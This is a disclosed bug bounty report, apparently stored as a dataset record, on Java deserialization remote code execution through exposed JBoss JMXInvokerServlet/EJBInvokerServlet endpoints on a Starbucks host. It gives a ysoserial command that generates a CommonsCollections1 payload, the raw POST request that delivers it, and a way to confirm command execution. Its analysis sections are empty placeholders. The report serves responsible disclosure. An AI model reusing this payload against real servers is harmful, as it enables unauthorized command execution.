---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '153026'
original_report_id: '153026'
title: Java Deserialization RCE via JBoss JMXInvokerServlet/EJBInvokerServlet on card.starbucks.in
weakness: Code Injection
team_handle: starbucks
created_at: '2016-07-21T23:04:33.767Z'
disclosed_at: '2017-02-03T22:47:45.617Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 41
asset_identifier: Other assets
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- code-injection
---

# Java Deserialization RCE via JBoss JMXInvokerServlet/EJBInvokerServlet on card.starbucks.in

## Metadata

- HackerOne Report ID: 153026
- Weakness: Code Injection
- Program: starbucks
- Disclosed At: 2017-02-03T22:47:45.617Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I found an open JMXInvokerServlet/EJBInvokerServlet and normally I should be able to get a shell just by doing that. However I think due to some egress filtering on the box I've been having issues getting a shell to run.

Invokers: https://card.starbucks.in/invoker/EJBInvokerServlet and https://card.starbucks.in/invoker/JMXInvokerServlet

Command to output serialized data to a file:
$ java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'cmd.exe' > serialdata
{F106535}

This puts the serialized data for executing cmd.exe into a file that I can then paste into burp.

Create a new burp repeater tab and paste in the following (running on https):

POST /invoker/EJBInvokerServlet HTTP/1.1
Host: card.starbucks.in
Accept: */*
Accept-Language: en
ContentType: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 0

Then right click an select "Paste from file"
{F106537} 

Hit Go and our burp repeater tab should look like the following:
{F106538} 

You will notice I am searching for the string "cannot find" in the response tab. If a file is not found on the windows host it will return saying "The system cannot find the file specified" as well as another variation of that.  Since the first request is for cmd.exe which IS found on the system this error is not present. This can also be verified by running telnet, ftp, calc.exe.

The following will produce a "The system cannot find the file specified" error:
$ java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'fakefile.exe' > serialdata

Burp Output:
{F106541} 


This is proving that files are being run on the system.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
